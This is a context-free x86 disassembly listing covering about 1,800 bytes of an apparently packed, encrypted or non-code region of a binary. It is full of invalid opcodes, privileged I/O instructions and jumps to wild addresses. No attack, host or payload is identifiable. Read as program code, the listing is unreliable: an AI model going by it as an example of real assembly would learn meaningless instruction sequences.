  40a465:	cwde   
  40a466:	pop    ebx
  40a467:	cmp    al,0x5
  40a469:	mov    bh,0x51
  40a46b:	sub    DWORD PTR [eax],ecx
  40a46d:	lock outs dx,DWORD PTR ds:[esi]
  40a46f:	and    edx,edi
  40a471:	mov    ecx,0xeb28c4d
  40a476:	mov    esp,0xd63de39e
  40a47b:	stos   BYTE PTR es:[edi],al
  40a47c:	lahf   
  40a47d:	pop    eax
  40a47e:	and    BYTE PTR [eax-0x73fee54c],bl
  40a484:	mov    dl,0xe
  40a486:	es pushf 
  40a488:	in     al,0x6a
  40a48a:	inc    ebp
  40a48b:	mov    WORD PTR [edx+0xe],?
  40a491:	add    BYTE PTR [eax],al
  40a493:	add    BYTE PTR [edx-0x49628fc8],bh
  40a499:	daa    
  40a49a:	fwait
  40a49b:	sub    DWORD PTR [edx+0x27],0x656fd69a
  40a4a2:	test   DWORD PTR [edx-0x71758e84],ecx
  40a4a8:	jge    0x40a467
  40a4aa:	(bad)  
  40a4ab:	nop
  40a4ac:	popa   
  40a4ad:	sub    al,0x83
  40a4af:	xchg   DWORD PTR [ebx+esi*1-0x78],eax
  40a4b3:	mov    BYTE PTR [edi-0xefff14d],bl
  40a4b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4ba:	sbb    BYTE PTR [eax+edi*4],bl
  40a4bd:	mov    eax,ds:0xb2b90f0b
  40a4c2:	push   cs
  40a4c3:	add    BYTE PTR ds:0x54f7f44f,dh
  40a4c9:	pop    esi
  40a4ca:	cmc    
  40a4cb:	add    BYTE PTR [ebp+esi*4-0x4d46f6e3],ah
  40a4d2:	push   cs
  40a4d3:	add    bl,cl
  40a4d5:	js     0x40a546
  40a4d7:	arpl   si,bx
  40a4d9:	ror    DWORD PTR [esi],cl
  40a4db:	add    BYTE PTR [eax],al
  40a4dd:	push   ss
  40a4de:	test   eax,0xf8540fa2
  40a4e3:	stc    
  40a4e4:	imul   esi,DWORD PTR [edx-0x556ffff2],0xed360207
  40a4ee:	push   esi
  40a4ef:	add    BYTE PTR ds:0x3a0904ac,dl
  40a4f5:	stos   DWORD PTR es:[edi],eax
  40a4f6:	pop    es
  40a4f7:	add    BYTE PTR [eax],al
  40a4f9:	add    BYTE PTR [eax],al
  40a4fb:	add    BYTE PTR [eax],al
  40a4fd:	push   0xffffffa6
  40a4ff:	push   cs
  40a500:	add    eax,0x1f05a968
  40a505:	cs mov al,0x10
  40a508:	adc    al,0xe1
  40a50a:	mov    dh,0xe
  40a50c:	add    al,dl
  40a50e:	(bad)  
  40a50f:	jnp    0x40a58b
  40a511:	nop
  40a512:	fnstsw WORD PTR [eax+edi*1-0x36]
  40a516:	in     eax,dx
  40a517:	addr16 jnp 0x40a4b2
  40a51a:	jl     0x40a535
  40a51c:	push   ebx
  40a51d:	cdq    
  40a51e:	jg     0x40a58a
  40a520:	popa   
  40a521:	je     0x40a4a7
  40a523:	add    BYTE PTR fs:[eax+0x48441e6c],dl
  40a52a:	lea    ebx,[eax+0x9]
  40a52d:	nop
  40a52e:	fsub   DWORD PTR [ebx-0x451cd361]
  40a534:	mul    DWORD PTR [ebx]
  40a536:	call   0x2120a4f2
  40a53b:	mov    ebx,0xa8716a1
  40a540:	add    BYTE PTR [eax+0x4e425751],dl
  40a546:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a547:	dec    edx
  40a548:	add    BYTE PTR [eax-0x14586ce1],dl
  40a54e:	loope  0x40a54b
  40a550:	mov    bh,0xe1
  40a552:	and    eax,0x1790000b
  40a557:	inc    edi
  40a558:	dec    ecx
  40a559:	cmp    BYTE PTR [ebx+0x78],ch
  40a55c:	jl     0x40a5ad
  40a55e:	sbb    al,0x31
  40a560:	dec    ebp
  40a561:	add    BYTE PTR [eax],al
  40a563:	add    BYTE PTR [eax],al
  40a565:	add    BYTE PTR [eax],al
  40a567:	add    DWORD PTR [edx+0x7f],edi
  40a56a:	test   DWORD PTR [ebx+0xc],0xf479000
  40a571:	add    DWORD PTR [edi+eiz*2+0x4bae2936],edx
  40a578:	or     al,0x0
  40a57a:	nop
  40a57b:	jb     0x40a58f
  40a57d:	and    al,0xaa
  40a57f:	pop    ecx
  40a580:	sbb    al,0x13
  40a582:	nop
  40a583:	inc    ebp
  40a584:	stc    
  40a585:	cli    
  40a586:	inc    edi
  40a587:	mov    eax,cs
  40a589:	ret    
  40a58a:	nop
  40a58b:	daa    
  40a58c:	push   edi
  40a58d:	pop    ecx
  40a58e:	loopne 0x40a542
  40a590:	push   ebx
  40a591:	pop    esp
  40a592:	mov    esi,0x9003e5d4
  40a597:	mov    dl,0x86
  40a599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a59a:	sti    
  40a59b:	push   es
  40a59c:	jbe    0x40a521
  40a59e:	fsub   DWORD PTR [edx+edx*2]
  40a5a1:	mov    ss,esp
  40a5a3:	es popa 
  40a5a5:	mov    dh,0x2a
  40a5a7:	sbb    DWORD PTR [ecx-0x69],ebp
  40a5aa:	sbb    DWORD PTR [edx+eax*2],esp
  40a5ad:	add    edx,DWORD PTR [eax+0x5b572fb2]
  40a5b3:	in     al,0x8
  40a5b5:	jns    0x40a60c
  40a5b7:	rcr    DWORD PTR [ecx],0x64
  40a5ba:	data16 mov dl,0x71
  40a5bd:	loopne 0x40a5af
  40a5bf:	cmp    DWORD PTR [ebx-0x57952942],ebp
  40a5c5:	int    0xd3
  40a5c7:	mov    cl,0xca
  40a5c9:	and    DWORD PTR [eax],eax
  40a5cb:	add    BYTE PTR [eax],al
  40a5cd:	add    BYTE PTR [eax],al
  40a5cf:	jo     0x40a64c
  40a5d1:	sar    edi,0x77
  40a5d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5d5:	out    dx,eax
  40a5d6:	adc    BYTE PTR [edx-0x68fbf050],ah
  40a5dc:	cdq    
  40a5dd:	jecxz  0x40a5e4
  40a5df:	nop
  40a5e0:	mov    dl,0x21
  40a5e2:	ret    
  40a5e3:	rol    BYTE PTR [edx],cl
  40a5e5:	dec    esp
  40a5e6:	stc    
  40a5e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5e8:	inc    ecx
  40a5e9:	pop    esi
  40a5ea:	add    edx,DWORD PTR [eax+0x52c81db2]
  40a5f0:	jbe    0x40a61d
  40a5f2:	rcr    BYTE PTR [ebp+esi*1+0x25],0xbd
  40a5f7:	dec    eax
  40a5f8:	mov    bl,0xcf
  40a5fa:	and    dh,BYTE PTR [ebp-0x58d42170]
  40a600:	ror    dl,cl
  40a602:	pop    ds
  40a603:	scas   eax,DWORD PTR es:[edi]
  40a604:	mov    dl,0x70
  40a606:	push   edx
  40a607:	enter  0xbdda,0x56
  40a60b:	in     eax,dx
  40a60c:	in     eax,dx
  40a60d:	push   cs
  40a60e:	jl     0x40a5e4
  40a610:	xlat   BYTE PTR ds:[ebx]
  40a611:	dec    eax
  40a612:	xchg   esi,eax
  40a613:	lods   al,BYTE PTR ds:[esi]
  40a614:	loope  0x40a665
  40a616:	xor    edx,ebx
  40a618:	jmp    0xe8adfb2b
  40a61d:	aas    
  40a61e:	inc    edx
  40a61f:	shl    dh,0x4f
  40a622:	inc    edi
  40a623:	(bad)  
  40a624:	repz dec esp
  40a626:	sbb    al,0xd2
  40a628:	hlt    
  40a629:	jl     0x40a614
  40a62b:	xchg   ebx,eax
  40a62c:	mov    dl,0xe
  40a62e:	jmp    0x40a5e6
  40a630:	jle    0x40a667
  40a632:	int3   
  40a633:	add    BYTE PTR [eax],al
  40a635:	add    BYTE PTR [eax],al
  40a637:	add    BYTE PTR [ecx-0x5206da70],bl
  40a63d:	cmp    DWORD PTR [edx],0x1c82a7ca
  40a643:	jmp    0x184f58db
  40a648:	push   eax
  40a649:	jmp    0x40a68f
  40a64b:	pop    ss
  40a64c:	inc    ebp
  40a64d:	loope  0x40a6a3
  40a64f:	or     ch,BYTE PTR [ecx-0x10]
  40a652:	inc    edi
  40a653:	sbb    DWORD PTR [edi-0x11],ecx
  40a656:	jnp    0x40a670
  40a658:	pop    ebp
  40a659:	mov    dl,0xe
  40a65b:	dec    eax
  40a65c:	loopne 0x40a6ba
  40a65e:	aad    0x5f
  40a660:	in     eax,dx
  40a661:	jb     0x40a628
  40a663:	pop    edx
  40a664:	fldenv [ecx-0x28]
  40a667:	sub    edi,eax
  40a669:	pusha  
  40a66a:	in     al,dx
  40a66b:	sub    BYTE PTR [edi-0x5e0a0fc5],dh
  40a671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a672:	adc    esp,edx
  40a674:	popf   
  40a675:	pushf  
  40a676:	add    BYTE PTR [ebx],cl
  40a678:	xchg   esi,eax
  40a679:	pushf  
  40a67a:	or     al,0xfd
  40a67c:	mov    ebp,0x93f11098
  40a681:	mov    dl,0xe
  40a683:	push   es
  40a684:	and    eax,0x5139cf6b
  40a689:	jbe    0x40a665
  40a68b:	add    BYTE PTR [ebp-0x62363d08],cl
  40a691:	jo     0x40a65f
  40a693:	int3   
  40a694:	cmp    DWORD PTR [edi+0x4ca1000e],ebp
  40a69a:	jmp    0x40a796
  40a69f:	add    BYTE PTR [eax],al
  40a6a1:	inc    esi
  40a6a2:	dec    ecx
  40a6a3:	(bad)  
  40a6a4:	loop   0x40a688
  40a6a6:	inc    ecx
  40a6a7:	idiv   dh
  40a6a9:	loop   0x40a6e4
  40a6ab:	std    
  40a6ac:	sti    
  40a6ad:	cmc    
  40a6ae:	inc    esi
  40a6af:	into   
  40a6b0:	add    dl,dl
  40a6b2:	loope  0x40a6fe
  40a6b4:	push   esp
  40a6b5:	mov    ch,0xed
  40a6b7:	pop    ebp
  40a6b8:	inc    ecx
  40a6b9:	push   ecx
  40a6ba:	in     al,dx
  40a6bb:	push   ebp
  40a6bc:	pop    ebp
  40a6bd:	shl    esp,0x5e
  40a6c0:	pop    eax
  40a6c1:	xchg   bh,ah
  40a6c3:	ja     0x40a6c5
  40a6c5:	inc    edx
  40a6c6:	xor    bl,BYTE PTR [esp+eax*4-0x6e71419b]
  40a6cd:	inc    edx
  40a6ce:	sub    eax,0x18369b83
  40a6d3:	sbb    DWORD PTR [ecx-0x6f75fe96],0x5e
  40a6da:	sub    BYTE PTR [ebx-0xfd29869],bl
  40a6e0:	jmp    FWORD PTR [edx+0x4d]
  40a6e3:	repz clc 
  40a6e5:	outs   dx,DWORD PTR ds:[esi]
  40a6e6:	dec    eax
  40a6e7:	call   0xe138eaea
  40a6ec:	out    0x51,al
  40a6ee:	je     0x40a6e0
  40a6f0:	dec    DWORD PTR [esi+0x71]
  40a6f3:	iret   
  40a6f4:	(bad)  
  40a6f5:	(bad)  [eax-0x24]
  40a6f8:	ret    0x40b7
  40a6fb:	fstp   st(2)
  40a6fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6fe:	push   edx
  40a6ff:	lock (bad) 
  40a701:	mov    edx,0xfce43a
  40a706:	add    BYTE PTR [eax],al
  40a708:	add    BYTE PTR [eax],al
  40a70a:	popf   
  40a70b:	ds imul ecx
  40a70e:	nop
  40a70f:	mov    ecx,gs
  40a711:	hlt    
  40a712:	jae    0x40a74d
  40a714:	(bad)
  40a717:	lods   eax,DWORD PTR ds:[esi]
  40a718:	out    0xe5,eax
  40a71a:	pop    eax
  40a71b:	dec    esp
  40a71c:	or     al,0x0
  40a71e:	nop
  40a71f:	cmp    ebx,ebx
  40a721:	into   
  40a722:	pop    edi
  40a723:	cdq    
  40a724:	fstp   st(1)
  40a726:	dec    edx
  40a727:	ins    BYTE PTR es:[edi],dx
  40a728:	enter  0x50d5,0x8
  40a72c:	out    0xc6,al
  40a72e:	push   edx
  40a72f:	or     al,0xca
  40a731:	les    ebx,FWORD PTR ds:0x90000c4c
  40a737:	lds    ebp,FWORD PTR [esi-0x6d40ca4c]
  40a73d:	lahf   
  40a73e:	inc    eax
  40a73f:	in     al,0x91
  40a741:	mov    esp,0xa3a4c917
  40a746:	xor    ecx,edi
  40a748:	popf   
  40a749:	(bad)  
  40a74a:	out    dx,eax
  40a74b:	jb     0x40a734
  40a74d:	out    0xf2,al
  40a74f:	idiv   edx
  40a751:	repnz aam 0x27
  40a754:	aam    0xed
  40a756:	xlat   BYTE PTR ds:[ebx]
  40a757:	and    ebx,edx
  40a759:	(bad)  
  40a75a:	retf   
  40a75b:	sub    esp,edi
  40a75d:	in     eax,0xc0
  40a75f:	mov    ecx,0xbabfffc7
  40a764:	into   
  40a765:	into   
  40a766:	retf   0xc2cf
  40a769:	fidivr DWORD PTR [edi+edi*2+0xc5cb]
  40a770:	add    BYTE PTR [eax],al
  40a772:	add    BYTE PTR [edi-0x3c013577],bh
  40a778:	xchg   ebx,eax
  40a779:	into   
  40a77a:	int    0xb8
  40a77c:	xchg   ecx,eax
  40a77d:	in     eax,0xff
  40a77f:	(bad)  
  40a780:	packssdw mm6,QWORD PTR [ebp-0x23]
  40a784:	not    BYTE PTR [ebp+0x46]
  40a787:	cmc    
  40a788:	jae    0x40a7f8
  40a78a:	ins    BYTE PTR es:[edi],dx
  40a78b:	lds    esi,FWORD PTR [edx-0x4010967a]
  40a791:	retf   
  40a792:	outs   dx,DWORD PTR ds:[esi]
  40a793:	fistp  QWORD PTR [ecx-0x4d6ffc5b]
  40a799:	inc    ebx
  40a79a:	div    edi
  40a79c:	inc    eax
  40a79d:	jg     0x40a773
  40a79f:	xor    edx,DWORD PTR [eax+0x1c]
  40a7a2:	lock das 
  40a7a4:	cmp    BYTE PTR [edi],dh
  40a7a6:	call   0x432d:0xc1433ceb
  40a7ad:	(bad)  
  40a7ae:	mov    cl,0x27
  40a7b0:	cmp    cl,al
  40a7b2:	fdivr  DWORD PTR [eax]
  40a7b4:	adc    BYTE PTR [ebp+0x642429ac],bl
  40a7ba:	(bad)  
  40a7bb:	sbb    al,0x4d
  40a7bd:	mov    dh,0xf5
  40a7bf:	adc    BYTE PTR [esi-0x60],ch
  40a7c2:	leave  
  40a7c3:	fistp  DWORD PTR [edi]
  40a7c5:	xchg   DWORD PTR [ebx+0x3e65d0b],esp
  40a7cb:	nop
  40a7cc:	mov    dl,0x2d
  40a7ce:	push   ss
  40a7cf:	lea    esi,[ebx-0x4d9a021d]
  40a7d5:	fld    DWORD PTR [ecx+0x0]
  40a7d8:	add    BYTE PTR [eax],al
  40a7da:	add    BYTE PTR [eax],al
  40a7dc:	cmp    bl,al
  40a7de:	and    DWORD PTR [eax+0x4f],edx
  40a7e1:	fnstenv [ecx-0x7d4d6ffd]
  40a7e7:	in     eax,0x14
  40a7e9:	xor    al,0x60
  40a7eb:	js     0x40a82c
  40a7ed:	sub    DWORD PTR [edi-0x23],esp
  40a7f0:	mov    bh,0x38
  40a7f2:	jae    0x40a86f
  40a7f4:	sbb    ch,BYTE PTR [eax]
  40a7f6:	outs   dx,DWORD PTR ds:[esi]
  40a7f7:	stos   BYTE PTR es:[edi],al
  40a7f8:	cmc    
  40a7f9:	pop    es
  40a7fa:	fwait
  40a7fb:	mov    dl,0xd8
  40a7fd:	adc    ebx,DWORD PTR [esi-0x7df01e50]
  40a803:	mov    al,ds:0xae5f3f30
  40a808:	aas    
  40a809:	or     BYTE PTR [edi],cl
  40a80b:	jle    0x40a826
  40a80d:	push   cs
  40a80e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a80f:	test   DWORD PTR [esi+0x53],esp
  40a812:	call   0xd1a6058e
  40a817:	jo     0x40a833
  40a819:	xor    BYTE PTR [esi-0x62d0f795],al
  40a81f:	sbb    eax,0x368e5e41
  40a824:	xor    eax,0x90e4f038
  40a829:	scas   al,BYTE PTR es:[edi]
  40a82a:	add    al,0xe2
  40a82c:	mov    ?,WORD PTR [edx-0xd325af2]
  40a832:	push   esi
  40a833:	sub    dl,bl
  40a835:	repz push edx
  40a837:	sub    eax,0xe903dcd2
  40a83c:	xchg   ebx,eax
  40a83d:	mov    dl,0xe
  40a83f:	add    al,BYTE PTR [eax]
  40a841:	add    BYTE PTR [eax],al
  40a843:	add    BYTE PTR [eax],al
  40a845:	jbe    0x40a7cf
  40a847:	xor    BYTE PTR [eax],cl
  40a849:	mov    ecx,0xbe243fde
  40a84e:	retf   0xdf37
  40a851:	call   FWORD PTR [esi-0x28bad501]
  40a857:	es jmp 0xda4f5af0
  40a85d:	inc    edi
  40a85e:	mov    BYTE PTR [esp+edx*8],dh
  40a861:	mov    eax,ds:0x3fd223d3
  40a866:	(bad)  
  40a867:	adc    BYTE PTR ss:[eax-0x5f18f14e],al
  40a86e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a86f:	push   cs
  40a870:	and    ecx,DWORD PTR [ebp-0x28]
  40a873:	push   edx
  40a874:	jmp    0x794f5b0c
  40a879:	sub    ah,BYTE PTR [ecx]
  40a87b:	fucomip st,st(1)
  40a87d:	xchg   ebx,eax
  40a87e:	mov    dl,0xe
  40a880:	ret    0xc920
  40a883:	and    edi,DWORD PTR [ebp+0xeb293]
  40a889:	or     ecx,DWORD PTR [ebx]
  40a88b:	mov    dl,0xbe
  40a88d:	pop    ss
  40a88e:	pop    es
  40a88f:	mov    dh,0xa1
  40a891:	adc    DWORD PTR [esi+0x7db000e],ebp
  40a897:	mov    eax,0xfd01f4b1
  40a89c:	xchg   ch,al
  40a89e:	(bad)  
  40a89f:	mov    ebx,0x258f3c00
  40a8a4:	sub    BYTE PTR [ebp+eax*4+0x33],al
  40a8a8:	add    BYTE PTR [eax],al
  40a8aa:	add    BYTE PTR [eax],al
  40a8ac:	add    BYTE PTR [eax],al
  40a8ae:	or     edx,DWORD PTR [ebp+esi*1+0xeb3393a]
  40a8b5:	add    dl,dh
  40a8b7:	fisttp QWORD PTR [esi]
  40a8b9:	add    dh,cl
  40a8bb:	pop    ss
  40a8bc:	lods   eax,DWORD PTR ds:[esi]
  40a8bd:	mov    edi,0xeb339
  40a8c2:	cdq    
  40a8c3:	mov    eax,ds:0xef610803
  40a8c8:	dec    ecx
  40a8c9:	adc    cl,ch
  40a8cb:	xchg   DWORD PTR [ebx],ecx
  40a8cd:	push   edi
  40a8ce:	ret    
  40a8cf:	jl     0x40a8e4
  40a8d1:	arpl   bp,ax
  40a8d3:	loopne 0x40a8dc
  40a8d5:	jg     0x40a8c0
  40a8d7:	mov    dl,0xe
  40a8d9:	add    BYTE PTR [ebx],ah
  40a8db:	je     0x40a8a9
  40a8dd:	sar    DWORD PTR [edx+edi*4],0x94
  40a8e1:	call   0x6535:0xccd56920
  40a8e8:	fmulp  st(1),st
  40a8ea:	sbb    DWORD PTR [ebp-0x33],esp
  40a8ed:	into   
  40a8ee:	sub    eax,0x2c8f8664
  40a8f3:	push   ebp
  40a8f4:	rcr    ebp,cl
  40a8f6:	out    dx,eax
  40a8f7:	hlt    
  40a8f8:	int    0xd9
  40a8fa:	inc    edx
  40a8fb:	inc    ebx
  40a8fc:	jmp    ebp
  40a8fe:	ss dec ebx
  40a900:	idiv   BYTE PTR [edx-0x490db9a7]
  40a906:	nop
  40a907:	fdivr  st,st(2)
  40a909:	neg    DWORD PTR [eax+0x75a9a7e2]
  40a90f:	jecxz  0x40a8e2
  40a911:	in     al,0x0
  40a913:	add    BYTE PTR [eax],al
  40a915:	add    BYTE PTR [eax],al
  40a917:	je     0x40a909
  40a919:	leave  
  40a91a:	jmp    0x40a960
  40a91c:	sub    BYTE PTR [eax+eax*1],cl
  40a91f:	nop
  40a920:	test   dh,ah
  40a922:	shl    BYTE PTR [edi-0x67],0xb
  40a926:	add    BYTE PTR [eax-0x64c1d895],dl
  40a92c:	pop    esp
  40a92d:	jge    0x40a990
  40a92f:	lock xor DWORD PTR [esi+0x27],edx
  40a933:	jno    0x40a999
  40a935:	add    ah,BYTE PTR [ebx]
  40a937:	ins    DWORD PTR es:[edi],dx
  40a938:	jo     0x40a98e
  40a93a:	arpl   WORD PTR [ebp+0x753b7a2e],bp
  40a940:	clc    
  40a941:	imul   ebp,DWORD PTR [ebx-0x4b],0xffffffe6
  40a945:	popa   
  40a946:	aaa    
  40a947:	ins    BYTE PTR es:[edi],dx
  40a948:	mov    bl,0x49
  40a94a:	push   edi
  40a94b:	pop    ecx
  40a94c:	push   edx
  40a94d:	or     al,0x1
  40a94f:	jnp    0x40a99f
  40a951:	sbb    DWORD PTR ds:0x4bf34094,ecx
  40a957:	nop
  40a958:	jns    0x40a9d4
  40a95a:	dec    ebx
  40a95b:	data16 lahf 
  40a95d:	or     al,BYTE PTR [eax]
  40a95f:	nop
  40a960:	mov    esp,0xd12f889f
  40a965:	or     al,BYTE PTR [eax]
  40a967:	nop
  40a968:	xor    eax,0x8f7d0435
  40a96d:	out    dx,eax
  40a96e:	sbb    al,0x44
  40a970:	jns    0x40a9be
  40a972:	pop    ecx
  40a973:	popf   
  40a974:	push   ebx
  40a975:	stc    
  40a976:	inc    edi
  40a978:	inc    eax
  40a979:	pop    es
  40a97a:	adc    al,0x0
  40a97c:	add    BYTE PTR [eax],al
  40a97e:	add    BYTE PTR [eax],al
  40a980:	gs inc edi
  40a982:	not    BYTE PTR [edi]
  40a984:	mov    eax,ds:0x90000aa5
  40a989:	mov    dl,0x8f
  40a98b:	mov    ch,0xea
  40a98d:	add    eax,0x359fe386
  40a992:	and    eax,0x295ac0ca
  40a997:	add    al,0x90
  40a999:	mov    dl,0xa
  40a99b:	and    BYTE PTR [edx-0xf9c444e],bh
  40a9a1:	(bad)  
  40a9a2:	int    0x5f
  40a9a4:	fild   WORD PTR [ebp-0x6e30d806]
  40a9aa:	(bad)  
  40a9ab:	sub    ecx,ebx
  40a9ad:	(bad)  
  40a9ae:	ret    0xd71f
  40a9b1:	mov    dl,0x83
  40a9b3:	(bad)
  40a9b8:	(bad)  
  40a9b9:	jecxz  0x40a969
  40a9bb:	imul   DWORD PTR [esi-0x6b948d48]
  40a9c1:	cdq    
  40a9c2:	fdiv   st(6),st
  40a9c4:	jns    0x40aa3c
  40a9c6:	jle    0x40aa10
  40a9c8:	shr    ah,1
  40a9ca:	loopne 0x40a9d3
  40a9cc:	retf   
  40a9cd:	fnstenv [eax]
  40a9cf:	dec    ebx
  40a9d0:	into   
  40a9d1:	fcom   QWORD PTR [esi-0x5]
  40a9d4:	test   bh,ch
  40a9d6:	das    
  40a9d7:	pop    edx
  40a9d8:	jge    0x40a9a7
  40a9da:	push   edi
  40a9db:	ins    BYTE PTR es:[edi],dx
  40a9dc:	outs   dx,BYTE PTR ds:[esi]
  40a9dd:	ror    DWORD PTR [eax+0x36],cl
  40a9e0:	stos   DWORD PTR es:[edi],eax
  40a9e1:	shl    DWORD PTR ds:0x73,cl
  40a9e7:	add    BYTE PTR [eax],al
  40a9e9:	outs   dx,DWORD PTR ds:[esi]
  40a9ea:	jns    0x40aa21
  40a9ec:	push   0x132dce6a
  40a9f1:	jge    0x40a994
  40a9f3:	hlt    
  40a9f4:	add    edx,DWORD PTR [eax+0x586cffb2]
  40a9fa:	mov    bh,0xd5
  40a9fc:	pop    ds
  40a9fd:	ja     0x40a985
  40a9ff:	repnz sbb edx,DWORD PTR [eax+0x138f63b2]
  40aa06:	aas    
  40aa07:	movd   ecx,mm6
  40aa0a:	xor    al,0xf0
  40aa0c:	cmc    
  40aa0d:	dec    edi
  40aa0e:	ror    DWORD PTR [ecx+ebp*8],0x42
  40aa12:	mov    dl,0xe
  40aa14:	xor    ch,al
  40aa16:	outs   dx,DWORD PTR ds:[esi]
  40aa17:	cli    
  40aa18:	pop    edi
  40aa19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa1a:	cld    
  40aa1b:	shl    DWORD PTR [edx],1
  40aa1d:	xchg   ebx,eax
  40aa1e:	mov    dl,0xe
  40aa20:	ror    DWORD PTR [edi-0x6c168849],1
  40aa26:	mov    dl,0xe
  40aa28:	xor    DWORD PTR ds:[edi-0x5],eax
  40aa2c:	test   BYTE PTR [ebp+0x43],cl
  40aa2f:	test   eax,0xeb293e9
  40aa34:	jo     0x40aa33
  40aa36:	mul    DWORD PTR [eax-0x6fef01bb]
  40aa3c:	arpl   WORD PTR [edi],bp
  40aa3e:	clc    
  40aa3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa40:	push   edi
  40aa41:	icebp  
  40aa42:	add    DWORD PTR [edi],ecx
  40aa44:	push   esp
  40aa45:	and    eax,0xb8239e2d
  40aa4a:	push   ds
  40aa4b:	movsx  eax,WORD PTR [eax]
  40aa4e:	add    BYTE PTR [eax],al
  40aa50:	add    BYTE PTR [eax],al
  40aa52:	xchg   BYTE PTR [edi+0x33],bh
  40aa55:	sbb    dh,BYTE PTR [edi+0x75]
  40aa58:	and    al,0x61
  40aa5a:	jbe    0x40aad4
  40aa5c:	xor    ch,cl
  40aa5e:	xchg   ebx,eax
  40aa5f:	mov    dl,0xe
  40aa61:	dec    esi
  40aa62:	pop    eax
  40aa63:	lock inc esp
  40aa65:	sub    eax,esi
  40aa67:	out    0x1,al
  40aa69:	sbb    edx,DWORD PTR [edx+esi*4-0x760405f2]
  40aa70:	adc    bl,bl
  40aa72:	xchg   ebp,eax
  40aa73:	stos   BYTE PTR es:[edi],al
  40aa74:	sbb    ch,ch
  40aa76:	xchg   ebp,eax
  40aa77:	mov    dl,0xe
  40aa79:	mov    esp,0xe9e938b9
  40aa7e:	xchg   ebx,eax
  40aa7f:	mov    dl,0xe
  40aa81:	jmp    0x4f5d19
  40aa86:	loopne 0x40aa25
  40aa88:	xor    ebp,DWORD PTR ds:0x3e2696b6
  40aa8e:	sti    
  40aa8f:	retf   0x397a
  40aa92:	in     al,0x92
  40aa94:	sub    DWORD PTR [edi+ebp*2],edi
  40aa97:	xchg   esp,eax
  40aa98:	outs   dx,BYTE PTR ds:[esi]
  40aa99:	sub    al,0x96
  40aa9b:	xchg   esp,eax
  40aa9c:	sub    eax,0x29d78822
  40aaa1:	sub    BYTE PTR [esi-0x70d9dc67],cl
  40aaa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaa8:	sbb    BYTE PTR [esi],bl
  40aaaa:	outs   dx,DWORD PTR ds:[esi]
  40aaab:	lahf   
  40aaac:	sbb    DWORD PTR [ecx],ecx
  40aaae:	pop    ss
  40aaaf:	out    0x58,al
  40aab1:	inc    edi
  40aab2:	add    BYTE PTR [ecx+0x6f],bh
  40aab5:	jns    0x40aab7
  40aab7:	add    BYTE PTR [eax],al
  40aab9:	add    BYTE PTR [eax],al
  40aabb:	nop
  40aabc:	lods   al,BYTE PTR ds:[esi]
  40aabd:	add    ebx,DWORD PTR ds:0xe16a646
  40aac3:	imul   edi,DWORD PTR [edx+0x4a],0x17
  40aac7:	dec    ebx
  40aac8:	aaa    
  40aac9:	sbb    al,0x2
  40aacb:	push   cs
  40aacc:	sar    DWORD PTR [esi],cl
  40aace:	jl     0x40aa95
  40aad0:	retf   
  40aad1:	jae    0x40ab3c
  40aad3:	and    cl,al
  40aad5:	dec    ecx
  40aad6:	jg     0x40aaec
  40aad8:	sar    BYTE PTR [eax+0x7c],cl
  40aadb:	mov    dl,0xcf
  40aadd:	cs ins BYTE PTR es:[edi],dx
  40aadf:	(bad)  
  40aae0:	aam    0x6d
  40aae2:	(bad)  
  40aae3:	enter  0x2ac4,0x2b
  40aae7:	cdq    
  40aae8:	shr    DWORD PTR [ebx+0x6f],cl
  40aaeb:	mov    esi,0x40417e6
  40aaf0:	cmp    BYTE PTR [edi],0x48
  40aaf3:	cwde   
  40aaf4:	jae    0x40ab5b
  40aaf6:	inc    edi
  40aaf7:	mov    ebx,0xdf1b5ae2
  40aafc:	in     al,dx
  40aafd:	inc    ebx
  40aafe:	dec    esp
  40aaff:	pushf  
  40ab00:	out    0x4b,eax
  40ab02:	pop    edi
  40ab03:	nop
  40ab04:	jle    0x40aaf9
  40ab06:	push   eax
  40ab07:	push   esi
  40ab08:	ja     0x40ab41
  40ab0a:	jge    0x40ab69
  40ab0c:	jbe    0x40aab1
  40ab0e:	test   al,0x6
  40ab10:	jnp    0x40aabb
  40ab12:	test   dh,bh
  40ab14:	jge    0x40aaac
  40ab16:	mov    dl,0xe3
  40ab18:	mov    dh,0xe6
  40ab1a:	icebp  
  40ab1b:	fstp   QWORD PTR ds:0xbcab
  40ab21:	add    BYTE PTR [eax],al
  40ab23:	add    dl,ch
  40ab25:	jmp    0x1a127227
  40ab2a:	mov    ds:0xbaa145a2,al
  40ab2f:	scas   eax,DWORD PTR es:[edi]
  40ab30:	cs xchg esi,eax
  40ab32:	(bad)  
  40ab34:	or     al,0x8f
  40ab36:	test   DWORD PTR [esi-0x717578f7],ecx
  40ab3c:	dec    ecx
  40ab3d:	cdq    
  40ab3e:	fwait
  40ab3f:	jg     0x40ab46
  40ab41:	lea    eax,[esi+eax*4-0x7c744ef6]
  40ab48:	add    al,0x85
  40ab4a:	jae    0x40aada
  40ab4c:	das    
  40ab4d:	xchg   edi,eax
  40ab4e:	mov    cs,ebx
  40ab50:	and    BYTE PTR [eax],dh
  40ab52:	(bad)  
  40ab53:	call   0xf922d4a8
  40ab58:	repnz mov ss:0xe82b21b5,al
  40ab5f:	loopne 0x40ab7f
  40ab61:	aas    
  40ab62:	mov    eax,ds:0xe50f1582
  40ab67:	out    dx,al
  40ab68:	sbb    DWORD PTR [ebp-0x20],esp
  40ab6b:	repz repnz stc 
  40ab6e:	xchg   ebx,eax
  40ab6f:	lahf   
  40ab70:	add    BYTE PTR [ebx-0x37],dl
  40ab73:	retf   0x4acd
  40ab76:	mov    eax,0xdf5d1dc2
  40ab7b:	ret    
  40ab7c:	leave  
  40ab7d:	jo     0x40ab4c
  40ab7f:	mov    cl,0xb2
  40ab82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
